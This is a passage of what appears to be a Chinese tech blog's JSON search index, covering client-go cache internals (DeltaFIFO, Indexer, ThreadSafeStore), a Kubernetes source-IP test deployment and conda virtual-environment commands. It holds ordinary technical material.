more recent) // has since been added. AddIfNotPresent(interface{}) error // Return true if the first batch of items has been popped HasSynced() bool // Close queue Close() } Queue是在Store基础上扩展了Pop接口可以让对象有序的弹出，Indexer是在Store基础上建立了索引，可以快速检索对象。 ","date":"2021-08-31","objectID":"/posts/2021/08/k8s-go-client-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/:6:1","tags":["K8S"],"title":"K8S go-client 源码分析","uri":"/posts/2021/08/k8s-go-client-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"},{"categories":["K8S"],"content":"DeltaFIFO实现 首先我们想想为什么每个对象一个Deltas而不是Delta？对一个对象的多个操作，什么操作可以合并？ DeltaFIFO生产者和消费者是异步的，如果同一个目标的频繁操作，前面操作还缓存在队列中的时候，那么队列就要缓冲对象的所有操作，那可以将多个操作合并么？这是下面讨论的了； 对于更新这种类型的操作在没有全量基础的情况下是没法合并的，同时我们还不知道具体是什么类型的对象，所以能合并的也就是有添加/删除，两个添加/删除操作其实可以视为一个； 因为系统对于删除的对象有DeletedFinalStateUnknown这个状态，所以会存在两次删除的情况，但是两次添加同一个对象由于apiserver可以保证对象的唯一性，所以处理中就没有考虑合并两次添加操作。 这就是为什么合并操作处理只考虑了Delete client-go/tools/cache/delta_fifo.go /* Copyright 2014 The Kubernetes Authors. Licensed under the Apache License, Version 2.0 (the \"License\"); you may not use this file except in compliance with the License. You may obtain a copy of the License at http://www.apache.org/licenses/LICENSE-2.0 Unless required by applicable law or agreed to in writing, software distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the License for the specific language governing permissions and limitations under the License. */ package cache import ( \"errors\" \"fmt\" \"sync\" \"k8s.io/apimachinery/pkg/util/sets\" \"github.com/golang/glog\" ) // NewDeltaFIFO returns a Store which can be used process changes to items. // // keyFunc is used to figure out what key an object should have. (It's // exposed in the returned DeltaFIFO's KeyOf() method, with bonus features.) // // 'compressor' may compress as many or as few items as it wants // (including returning an empty slice), but it should do what it // does quickly since it is called while the queue is locked. // 'compressor' may be nil if you don't want any delta compression. // // 'keyLister' is expected to return a list of keys that the consumer of // this queue \"knows about\". It is used to decide which items are missing // when Replace() is called; 'Deleted' deltas are produced for these items. // It may be nil if you don't need to detect all deletions. // TODO: consider merging keyLister with this object, tracking a list of // \"known\" keys when Pop() is called. Have to think about how that // affects error retrying. // TODO(lavalamp): I believe there is a possible race only when using an // external known object source that the above TODO would // fix. // // Also see the comment on DeltaFIFO. func NewDeltaFIFO(keyFunc KeyFunc, compressor DeltaCompressor, knownObjects KeyListerGetter) *DeltaFIFO { f := \u0026DeltaFIFO{ items: map[string]Deltas{}, queue: []string{}, keyFunc: keyFunc, deltaCompressor: compressor, knownObjects: knownObjects, } f.cond.L = \u0026f.lock return f } // DeltaFIFO is like FIFO, but allows you to process deletes. // // DeltaFIFO is a producer-consumer queue, where a Reflector is // intended to be the producer, and the consumer is whatever calls // the Pop() method. // // DeltaFIFO solves this use case: // * You want to process every object change (delta) at most once. // * When you process an object, you want to see everything // that's happened to it since you last processed it. // * You want to process the deletion of objects. // * You might want to periodically reprocess objects. // // DeltaFIFO's Pop(), Get(), and GetByKey() methods return // interface{} to satisfy the Store/Queue interfaces, but it // will always return an object of type Deltas. // // A note on threading: If you call Pop() in parallel from multiple // threads, you could end up with multiple threads processing slightly // different versions of the same object. // // A note on the KeyLister used by the DeltaFIFO: It's main purpose is // to list keys that are \"known\", for the purpose of figuring out which // items have been deleted when Replace() or Delete() are called. The deleted // object will be included in the DeleteFinalStateUnknown markers. These objects // could be stale. // // You may provide a function to compress deltas (e.g., represent a // series of Updates as a single Update). type DeltaFIFO struct { // lock/cond protects access to 'items' and 'queue'. // 读写锁，因为涉及到同时读写，读写锁性能要高 lock sync.RWMutex // 给Pop()接口使用，在没有对象的时候可以阻塞，内部锁复用读写锁 cond sync.Cond // We depend on the prope","date":"2021-08-31","objectID":"/posts/2021/08/k8s-go-client-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/:6:2","tags":["K8S"],"title":"K8S go-client 源码分析","uri":"/posts/2021/08/k8s-go-client-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"},{"categories":["K8S"],"content":"说明 判断是否已同步populated和initialPopulationCount这两个变量存在的目的是什么？我的理解是否已同步指的是第一次从apiserver获取全量对象是否已经全部通知到外部，也就是通过Pop()被取走。所谓的同步就是指apiserver的状态已经同步到缓存中了，也就是Indexer中； 接口AddIfNotPresent()存在的目的是什么，只有在Pop()函数中使用了一次，但是在调用这个接口的时候已经从map中删除了，所以肯定不存在。这个接口在我看来主要用来保险的，因为Pop()本身就存在重入队列的可能，外部如果判断返回错误重入队列就可能会重复； 最后，我们还是用一幅图来总结一下 ","date":"2021-08-31","objectID":"/posts/2021/08/k8s-go-client-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/:6:3","tags":["K8S"],"title":"K8S go-client 源码分析","uri":"/posts/2021/08/k8s-go-client-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"},{"categories":["K8S"],"content":"Index index 就是带索引器的本地缓存 ","date":"2021-08-31","objectID":"/posts/2021/08/k8s-go-client-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/:7:0","tags":["K8S"],"title":"K8S go-client 源码分析","uri":"/posts/2021/08/k8s-go-client-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"},{"categories":["K8S"],"content":"index tools/cache/index.go package cache import ( \"fmt\" \"k8s.io/apimachinery/pkg/api/meta\" \"k8s.io/apimachinery/pkg/util/sets\" ) // Indexer is a storage interface that lets you list objects using multiple indexing functions type Indexer interface { Store // Retrieve list of objects that match on the named indexing function // indexName索引类，obj是对象，计算obj在indexName索引类中的索引键，通过索引键把所有的对象取出来 // 基本就是获取符合obj特征的所有对象，所谓的特征就是对象在索引类中的索引键 Index(indexName string, obj interface{}) ([]interface{}, error) // IndexKeys returns the set of keys that match on the named indexing function. // indexKey是indexName索引类中一个索引键，函数返回indexKey指定的所有对象键 // 这个对象键是Indexer内唯一的，在添加的时候会计算 IndexKeys(indexName, indexKey string) ([]string, error) // ListIndexFuncValues returns the list of generated values of an Index func // 获取indexName索引类中的所有索引键 ListIndexFuncValues(indexName string) []string // ByIndex lists object that match on the named indexing function with the exact key // 这个函数和Index类似，只是返回值不是对象键，而是所有对象 ByIndex(indexName, indexKey string) ([]interface{}, error) // GetIndexer return the indexers // 返回Indexers GetIndexers() Indexers // AddIndexers adds more indexers to this store. If you call this after you already have data // in the store, the results are undefined. // 添加Indexers，就是增加更多的索引分类 AddIndexers(newIndexers Indexers) error } // IndexFunc knows how to provide an indexed value for an object. type IndexFunc func(obj interface{}) ([]string, error) // IndexFuncToKeyFuncAdapter adapts an indexFunc to a keyFunc. This is only useful if your index function returns // unique values for every object. This is conversion can create errors when more than one key is found. You // should prefer to make proper key and index functions. func IndexFuncToKeyFuncAdapter(indexFunc IndexFunc) KeyFunc { return func(obj interface{}) (string, error) { indexKeys, err := indexFunc(obj) if err != nil { return \"\", err } if len(indexKeys) \u003e 1 { return \"\", fmt.Errorf(\"too many keys: %v\", indexKeys) } if len(indexKeys) == 0 { return \"\", fmt.Errorf(\"unexpected empty indexKeys\") } return indexKeys[0], nil } } const ( NamespaceIndex string = \"namespace\" ) // MetaNamespaceIndexFunc is a default index function that indexes based on an object's namespace func MetaNamespaceIndexFunc(obj interface{}) ([]string, error) { meta, err := meta.Accessor(obj) if err != nil { return []string{\"\"}, fmt.Errorf(\"object has no meta: %v\", err) } return []string{meta.GetNamespace()}, nil } // Index maps the indexed value to a set of keys in the store that match on that value // sets.String 保存的是 本地缓存的key set， // 这个map的key 即为索引值keyvalue，比如usernmae1 // map[string]sets.String map[username1]{default/pod1, default/pod2} // Index 索引器，包含不同keyvalue的map type Index map[string]sets.String // sets.String is a set of strings, implemented via map[string]struct{} for minimal memory consumption. // sets.String 保存的是 本地缓存的key set，即cache items存储obj的key //type String map[string]Empty // Indexers maps a name to a IndexFunc // 计算索引的函数有很多, 采用map，用名字分类 type Indexers map[string]IndexFunc // 计算索引的函数，传入对象，输出字符串索引，注意是数组哦！ //type IndexFunc func(obj interface{}) ([]string, error) // Indices maps a name to an Index // 由于有多种计算索引的方式，那就又要按照计算索引的方式组织索引 // Indices的 key 即为 Indexers的key // Indices 索引器map，包含不同命名的索引器 type Indices map[string]Index Indexer-\u003eStore就是缓存接口 cache实现了store接口 数据对象缓存到了cache.cacheStorage ThreadSafeStore ThreadSafeStore 是线程安全的 所谓索引，索引目的就是为了快速查找。比如，我们需要查找某个节点上的所有Pod，那就要Pod按照节点名称排序，对应上面的Index类型就是map[nodename]sets.podname。我们可能有很多种查找方式，这就是Indexers这个类型作用了。 IndexFunc1…..这些都是索引函数的名称，我们称之为索引类，大概意思就是把索引分类了； IndexKey1….这些是同一个对象在同一个索引类中的多个索引键值，我们称为索引键，切记索引键有多个； ObjKey1…..这些是对象键，每个对象都有唯一的名称； Indexers和Indices都是按照IndexFunc(名字)分组， 每个IndexFunc输出多个IndexKey，产生相同IndexKey的多个对象存储在一个集合中。 ","date":"2021-08-31","objectID":"/posts/2021/08/k8s-go-client-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/:7:1","tags":["K8S"],"title":"K8S go-client 源码分析","uri":"/posts/2021/08/k8s-go-client-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"},{"categories":["K8S"],"content":"store tools/cache/store.go package cache import ( \"fmt\" \"strings\" \"k8s.io/apimachinery/pkg/api/meta\" ) // Store is a generic object storage interface. Reflector knows how to watch a server // and update a store. A generic store is provided, which allows Reflector to be used // as a local caching system, and an LRU store, which allows Reflector to work like a // queue of items yet to be processed. // // Store makes no assumptions about stored object identity; it is the responsibility // of a Store implementation to provide a mechanism to correctly key objects and to // define the contract for obtaining objects by some arbitrary key type. type Store interface { Add(obj interface{}) error Update(obj interface{}) error Delete(obj interface{}) error List() []interface{} // 列举对象键 ListKeys() []string // 返回obj相同对象键的对象，对象键是通过对象计算出来的字符串 Get(obj interface{}) (item interface{}, exists bool, err error) // 通过对象键获取对象 GetByKey(key string) (item interface{}, exists bool, err error) // Replace will delete the contents of the store, using instead the // given list. Store takes ownership of the list, you should not reference // it after calling this function. // 用[]interface{}替换Store存储的所有对象，等同于删除全部原有对象在逐一添加新的对象 Replace([]interface{}, string) error // 重新同步 Resync() error } // KeyFunc knows how to make a key from an object. Implementations should be deterministic. type KeyFunc func(obj interface{}) (string, error) // cache responsibilities are limited to: // 1. Computing keys for objects via keyFunc // 2. Invoking methods of a ThreadSafeStorage interface type cache struct { // cacheStorage bears the burden of thread safety for the cache cacheStorage ThreadSafeStore // keyFunc is used to make the key for objects stored in and retrieved from items, and // should be deterministic. keyFunc KeyFunc } var _ Store = \u0026cache{} ","date":"2021-08-31","objectID":"/posts/2021/08/k8s-go-client-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/:7:2","tags":["K8S"],"title":"K8S go-client 源码分析","uri":"/posts/2021/08/k8s-go-client-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"},{"categories":["K8S"],"content":"thread_safe_store tools/cache/thread_safe_store.go /* Copyright 2014 The Kubernetes Authors. Licensed under the Apache License, Version 2.0 (the \"License\"); you may not use this file except in compliance with the License. You may obtain a copy of the License at http://www.apache.org/licenses/LICENSE-2.0 Unless required by applicable law or agreed to in writing, software distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the License for the specific language governing permissions and limitations under the License. */ package cache import ( \"fmt\" \"sync\" \"k8s.io/apimachinery/pkg/util/sets\" ) // ThreadSafeStore is an interface that allows concurrent access to a storage backend. // TL;DR caveats: you must not modify anything returned by Get or List as it will break // the indexing feature in addition to not being thread safe. // // The guarantees of thread safety provided by List/Get are only valid if the caller // treats returned items as read-only. For example, a pointer inserted in the store // through `Add` will be returned as is by `Get`. Multiple clients might invoke `Get` // on the same key and modify the pointer in a non-thread-safe way. Also note that // modifying objects stored by the indexers (if any) will *not* automatically lead // to a re-index. So it's not a good idea to directly modify the objects returned by // Get/List, in general. type ThreadSafeStore interface { Add(key string, obj interface{}) Update(key string, obj interface{}) Delete(key string) Get(key string) (item interface{}, exists bool) List() []interface{} ListKeys() []string Replace(map[string]interface{}, string) Index(indexName string, obj interface{}) ([]interface{}, error) IndexKeys(indexName, indexKey string) ([]string, error) ListIndexFuncValues(name string) []string ByIndex(indexName, indexKey string) ([]interface{}, error) GetIndexers() Indexers // AddIndexers adds more indexers to this store. If you call this after you already have data // in the store, the results are undefined. AddIndexers(newIndexers Indexers) error Resync() error } // threadSafeMap implements ThreadSafeStore type threadSafeMap struct { lock sync.RWMutex // key为keyfunc计算得出，namespace/name items map[string]interface{} // indexers maps a name to an IndexFunc // 索引器函数，用于计算索引key，如按注解byuser，构建索引 indexers Indexers // indices maps a name to an Index indices Indices } func (c *threadSafeMap) Add(key string, obj interface{}) { c.lock.Lock() defer c.lock.Unlock() oldObject := c.items[key] c.items[key] = obj c.updateIndices(oldObject, obj, key) } func (c *threadSafeMap) Update(key string, obj interface{}) { c.lock.Lock() defer c.lock.Unlock() oldObject := c.items[key] c.items[key] = obj c.updateIndices(oldObject, obj, key) } func (c *threadSafeMap) Delete(key string) { c.lock.Lock() defer c.lock.Unlock() if obj, exists := c.items[key]; exists { c.deleteFromIndices(obj, key) delete(c.items, key) } } func (c *threadSafeMap) Get(key string) (item interface{}, exists bool) { c.lock.RLock() defer c.lock.RUnlock() item, exists = c.items[key] return item, exists } func (c *threadSafeMap) List() []interface{} { c.lock.RLock() defer c.lock.RUnlock() list := make([]interface{}, 0, len(c.items)) for _, item := range c.items { list = append(list, item) } return list } // ListKeys returns a list of all the keys of the objects currently // in the threadSafeMap. func (c *threadSafeMap) ListKeys() []string { c.lock.RLock() defer c.lock.RUnlock() list := make([]string, 0, len(c.items)) for key := range c.items { list = append(list, key) } return list } func (c *threadSafeMap) Replace(items map[string]interface{}, resourceVersion string) { c.lock.Lock() defer c.lock.Unlock() c.items = items // rebuild any index c.indices = Indices{} for key, item := range c.items { c.updateIndices(nil, item, key) } } // Index returns a list of items that match on the index function // Index is thread-safe so long as you treat al","date":"2021-08-31","objectID":"/posts/2021/08/k8s-go-client-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/:7:3","tags":["K8S"],"title":"K8S go-client 源码分析","uri":"/posts/2021/08/k8s-go-client-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"},{"categories":["K8S"],"content":"说明 索引键和对象键是两个重要概念 indexkey: 索引键是用于对象快速查找的，经过索引建在map中排序查找会更快； objkey: 对象键是为对象在存储中的唯一命名的，对象是通过名字+对象的方式存储的。默认格式为：namespace/name kubernetes中主要的索引函数，最主要的索引的函数大概就下面几种： MetaNamespaceIndexFunc，定义在client-go/tools/cache/index.go中，从名字看就是获取对象元数据的namesapce字段，也就是所有对象以namespace作为索引键，这个就很好理解了； indexByPodNodeName，定义在kubernetes/pkg/controller/daemon/deamon_controller.go，该索引函数计算的是Pod对象所在节点的名字； 为了方便理解，我们可以假设kubernetes主要就是一种索引函数（MetaNamespaceIndexFunc），也就是在索引中大部分就一个分类，这个分类的索引键就是namesapce。那么有人肯定会问，如果这样的话，所有的对象都存在一个namesapce索引键下面，这样的效率岂不是太低了?其实client-go为每类对象都创建了Informer(Informer内有Indexer)，所以即便存储在相同namesapce下的对象都是同一类，这个问题自然也就没有了，详情可以看我针对Informer写的文章。 注意：一定要区分MetaNamespaceIndexFunc和MetaNamespaceKeyFunc的区分，第一个索引键计算函数，第二个是对象键计算函数，第一个返回的是namespace，第二个返回的是对象包含namespace在内的对象全称。 所有的对象(Pod、Node、Service等等)都是有属性/标签的，如果属性/标签就是索引键，Indexer就会把相同属性/标签的所有对象放在一个集合中，如果在对属性/标签分一下类，也就就是我们本文的将的Indexer的核心内容了。甚至你可以简单的理解为Indexer就是简单的把相同namesapce对象放在一个集合中，kubernetes就是基于属性/标签/注解来检索的 ","date":"2021-08-31","objectID":"/posts/2021/08/k8s-go-client-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/:7:4","tags":["K8S"],"title":"K8S go-client 源码分析","uri":"/posts/2021/08/k8s-go-client-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"},{"categories":["K8S"],"content":"参考资料 client-go源码分析–informer机制流程分析 深入浅出kubernetes之client-go的Indexer 深入浅出kubernetes之client-go的DeltaFIFO 深入浅出kubernetes之client-go的SharedInformer k8s-sample-controller ","date":"2021-08-31","objectID":"/posts/2021/08/k8s-go-client-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/:8:0","tags":["K8S"],"title":"K8S go-client 源码分析","uri":"/posts/2021/08/k8s-go-client-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"},{"categories":["K8S"],"content":"K8S获取客户端ip[client ip]方法","date":"2021-07-01","objectID":"/posts/2021/07/k8s%E8%8E%B7%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AFipclient-ip%E6%96%B9%E6%B3%95/","tags":["K8S"],"title":"K8S获取客户端ip[client ip]方法","uri":"/posts/2021/07/k8s%E8%8E%B7%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AFipclient-ip%E6%96%B9%E6%B3%95/"},{"categories":["K8S"],"content":"一种测试验证K8S获取客户端ip[client ip]的方法 ","date":"2021-07-01","objectID":"/posts/2021/07/k8s%E8%8E%B7%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AFipclient-ip%E6%96%B9%E6%B3%95/:0:0","tags":["K8S"],"title":"K8S获取客户端ip[client ip]方法","uri":"/posts/2021/07/k8s%E8%8E%B7%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AFipclient-ip%E6%96%B9%E6%B3%95/"},{"categories":["K8S"],"content":"测试方法 ","date":"2021-07-01","objectID":"/posts/2021/07/k8s%E8%8E%B7%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AFipclient-ip%E6%96%B9%E6%B3%95/:1:0","tags":["K8S"],"title":"K8S获取客户端ip[client ip]方法","uri":"/posts/2021/07/k8s%E8%8E%B7%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AFipclient-ip%E6%96%B9%E6%B3%95/"},{"categories":["K8S"],"content":"部署source-ip-app source-ip-deploy-svc.yaml apiVersion:apps/v1kind:Deploymentmetadata:labels:name:source-ipname:source-ip-controllerspec:replicas:1selector:matchLabels:name:source-iptemplate:metadata:labels:name:source-ipspec:containers:# - image: gcr.io/google_containers/echoserver:1.4# - image: cilium/echoserver:latest- image:digiboy2008/echoserver:1.4name:source-ipimagePullPolicy:IfNotPresent---apiVersion:v1kind:Servicemetadata:name:source-iplabels:name:source-ipspec:type:NodePortports:- port:80nodePort:31999targetPort:8080protocol:TCPname:httpselector:name:source-ipexternalTrafficPolicy:LocalsessionAffinity:ClientIP create source-ip-deploy-svc kubectl create -f source-ip-deploy-svc.yaml 查看source-ip-svc服务 kubectl describe svc source-ip 获取客户端ip，在终端浏览器输入 # http://node_ip:node_port/ http://192.168.1.111:31999/ 显示内容： Hostname: source-ip-controller-548bd49748-pmb6j Pod Information: -no pod information available- Server values: server_version=nginx: 1.13.3 - lua: 10008 Request Information: client_address=::ffff:192.168.1.111 method=GET real path=/ query= request_version=1.1 request_scheme=http request_uri=http://192.168.1.111:8080/ Request Headers: accept=*/* host=192.168.1.111:31999 user-agent=curl/7.65.2 Request Body: -no body in request- ","date":"2021-07-01","objectID":"/posts/2021/07/k8s%E8%8E%B7%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AFipclient-ip%E6%96%B9%E6%B3%95/:1:1","tags":["K8S"],"title":"K8S获取客户端ip[client ip]方法","uri":"/posts/2021/07/k8s%E8%8E%B7%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AFipclient-ip%E6%96%B9%E6%B3%95/"},{"categories":["K8S"],"content":"删除source-ip-app kubectl delete -f source-ip-deploy-svc.yaml ","date":"2021-07-01","objectID":"/posts/2021/07/k8s%E8%8E%B7%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AFipclient-ip%E6%96%B9%E6%B3%95/:1:2","tags":["K8S"],"title":"K8S获取客户端ip[client ip]方法","uri":"/posts/2021/07/k8s%E8%8E%B7%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AFipclient-ip%E6%96%B9%E6%B3%95/"},{"categories":["K8S"],"content":"参考资料 source-ip官方文档 kubernetes的源地址保持(source IP preserve) 几种在 Kubernetes 集群中获取客户端真实 IP 的方法 k8s nginx应用-获取客户端访问真实IP k8s容器获取客户端真实ip配置 访问Kubernetes Service时的客户端源IP问题 kubernetes的源地址保持(source IP preserve) Kubernetes(二十三)Service(二)会话保持和获取客户端的ip ","date":"2021-07-01","objectID":"/posts/2021/07/k8s%E8%8E%B7%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AFipclient-ip%E6%96%B9%E6%B3%95/:2:0","tags":["K8S"],"title":"K8S获取客户端ip[client ip]方法","uri":"/posts/2021/07/k8s%E8%8E%B7%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AFipclient-ip%E6%96%B9%E6%B3%95/"},{"categories":["Python"],"content":"Anaconda配置python虚拟环境","date":"2021-06-16","objectID":"/posts/2021/06/anaconda%E9%85%8D%E7%BD%AEpython%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83/","tags":["Python"],"title":"Anaconda配置python虚拟环境","uri":"/posts/2021/06/anaconda%E9%85%8D%E7%BD%AEpython%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83/"},{"categories":["Python"],"content":"Anaconda是一个打包的集合，里面预装好了conda、某个版本的python、各种packages如：numpy，pandas，scipy，scikit-learn等。 conda将几乎所有的工具、第三方包都当作package进行管理，甚至包括python 和conda自身。 ","date":"2021-06-16","objectID":"/posts/2021/06/anaconda%E9%85%8D%E7%BD%AEpython%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83/:0:0","tags":["Python"],"title":"Anaconda配置python虚拟环境","uri":"/posts/2021/06/anaconda%E9%85%8D%E7%BD%AEpython%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83/"},{"categories":["Python"],"content":"1.安装Anaconda 下载相应版本Anaconda 或者打开Anaconda powershell prompt shell窗口 打开命令行输入conda -V检验是否安装及当前conda的版本。 ","date":"2021-06-16","objectID":"/posts/2021/06/anaconda%E9%85%8D%E7%BD%AEpython%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83/:1:0","tags":["Python"],"title":"Anaconda配置python虚拟环境","uri":"/posts/2021/06/anaconda%E9%85%8D%E7%BD%AEpython%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83/"},{"categories":["Python"],"content":"2.conda常用的命令 windows下，还需把安装路径anaconda3\\Scripts添加到环境变量中 ","date":"2021-06-16","objectID":"/posts/2021/06/anaconda%E9%85%8D%E7%BD%AEpython%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83/:2:0","tags":["Python"],"title":"Anaconda配置python虚拟环境","uri":"/posts/2021/06/anaconda%E9%85%8D%E7%BD%AEpython%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83/"},{"categories":["Python"],"content":"1)查看安装了哪些包 conda list ","date":"2021-06-16","objectID":"/posts/2021/06/anaconda%E9%85%8D%E7%BD%AEpython%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83/:2:1","tags":["Python"],"title":"Anaconda配置python虚拟环境","uri":"/posts/2021/06/anaconda%E9%85%8D%E7%BD%AEpython%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83/"},{"categories":["Python"],"content":"2)查看当前存在哪些虚拟环境 conda env list conda info -e ","date":"2021-06-16","objectID":"/posts/2021/06/anaconda%E9%85%8D%E7%BD%AEpython%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83/:2:2","tags":["Python"],"title":"Anaconda配置python虚拟环境","uri":"/posts/2021/06/anaconda%E9%85%8D%E7%BD%AEpython%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83/"},{"categories":["Python"],"content":"3)检查更新当前conda conda update conda ","date":"2021-06-16","objectID":"/posts/2021/06/anaconda%E9%85%8D%E7%BD%AEpython%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83/:2:3","tags":["Python"],"title":"Anaconda配置python虚拟环境","uri":"/posts/2021/06/anaconda%E9%85%8D%E7%BD%AEpython%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83/"},{"categories":["Python"],"content":"3.Python创建虚拟环境 conda create -n your_env_name python=x.x anaconda命令创建python版本为x.x，名字为your_env_name的虚拟环境。your_env_name文件可以在Anaconda安装目录envs文件下找到。 #conda create -n your_env_name python=x.x conda create -n ml_py3.8 python=3.8 创建虚拟环境成功 Downloading and Extracting Packages certifi-2021.5.30 | 140 KB | ########## | 100% wheel-0.36.2 | 33 KB | ########## | 100% pip-21.1.1 | 1.8 MB | ########## | 100% openssl-1.1.1k | 4.8 MB | ########## | 100% python-3.8.10 | 15.9 MB | ########## | 100% ca-certificates-2021 | 112 KB | ########## | 100% vc-14.2 | 8 KB | ########## | 100% vs2015_runtime-14.27 | 1007 KB | ########## | 100% wincertstore-0.2 | 15 KB | ########## | 100% setuptools-52.0.0 | 726 KB | ########## | 100% sqlite-3.35.4 | 761 KB | ########## | 100% Preparing transaction: ...working... done Verifying transaction: ...working... done Executing transaction: ...working... done # # To activate this environment, use # # $ conda activate ml_py3.8 # # To deactivate an active environment, use # # $ conda deactivate ","date":"2021-06-16","objectID":"/posts/2021/06/anaconda%E9%85%8D%E7%BD%AEpython%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83/:3:0","tags":["Python"],"title":"Anaconda配置python虚拟环境","uri":"/posts/2021/06/anaconda%E9%85%8D%E7%BD%AEpython%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83/"},{"categories":["Python"],"content":"4.激活或者切换虚拟环境 打开命令行，输入python –version检查当前 python 版本。 Linux: source activate your_env_name Windows: activate your_env_name # Linux #source activate your_env_name source activate ml_py3.8 #Windows #activate your_env_name activate ml_py3.8 ","date":"2021-06-16","objectID":"/posts/2021/06/anaconda%E9%85%8D%E7%BD%AEpython%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83/:4:0","tags":["Python"],"title":"Anaconda配置python虚拟环境","uri":"/posts/2021/06/anaconda%E9%85%8D%E7%BD%AEpython%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83/"},{"categories":["Python"],"content":"5.对虚拟环境中安装额外的包 conda install -n your_env_name [package] #conda install -n your_env_name [package] conda install -n ml_py3.8 scikit-learn ","date":"2021-06-16","objectID":"/posts/2021/06/anaconda%E9%85%8D%E7%BD%AEpython%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83/:5:0","tags":["Python"],"title":"Anaconda配置python虚拟环境","uri":"/posts/2021/06/anaconda%E9%85%8D%E7%BD%AEpython%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83/"},{"categories":["Python"],"content":"6.关闭虚拟环境(即从当前环境退出返回使用PATH环境中的默认python版本) deactivate env_name 或者activate root切回root环境 Linux下：source deactivate env_name #Linux # source deactivate your_env_name source deactivate ml_py3.8 #Windows #activate your_env_name deactivate ml_py3.8 在虚拟爱环境中登出 conda deactivate 如下： (ml_py3.8) C:\\Users\\test\u003econda deactivate C:\\Users\\test\u003e ","date":"2021-06-16","objectID":"/posts/2021/06/anaconda%E9%85%8D%E7%BD%AEpython%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83/:6:0","tags":["Python"],"title":"Anaconda配置python虚拟环境","uri":"/posts/2021/06/anaconda%E9%85%8D%E7%BD%AEpython%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83/"},{"categories":["Python"],"content":"7.删除虚拟环境 conda remove -n your_env_name –all # conda remove -n your_env_name --all conda remove -n ml_py3.8 --all ","date":"2021-06-16","objectID":"/posts/2021/06/anaconda%E9%85%8D%E7%BD%AEpython%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83/:7:0","tags":["Python"],"title":"Anaconda配置python虚拟环境","uri":"/posts/2021/06/anaconda%E9%85%8D%E7%BD%AEpython%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83/"},{"categories":["Python"],"content":"8.删除环境钟的某个包 conda remove –name $your_env_name $package_name conda remove --name $your_env_name $package_name ","date":"2021-06-16","objectID":"/posts/2021/06/anaconda%E9%85%8D%E7%BD%AEpython%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83/:8:0","tags":["Python"],"title":"Anaconda配置python虚拟环境","uri":"/posts/2021/06/anaconda%E9%85%8D%E7%BD%AEpython%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83/"},{"categories":["Python"],"content":"9.设置国内镜像 http://Anaconda.org的服务器在国外，安装多个packages时，conda下载的速度经常很慢。清华TUNA镜像源有Anaconda仓库的镜像，将其加入conda的配置即可： ","date":"2021-06-16","objectID":"/posts/2021/06/anaconda%E9%85%8D%E7%BD%AEpython%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83/:9:0","tags":["Python"],"title":"Anaconda配置python虚拟环境","uri":"/posts/2021/06/anaconda%E9%85%8D%E7%BD%AEpython%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83/"},{"categories":["Python"],"content":"添加Anaconda的TUNA镜像 conda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/free/ 或者 conda config --add channels 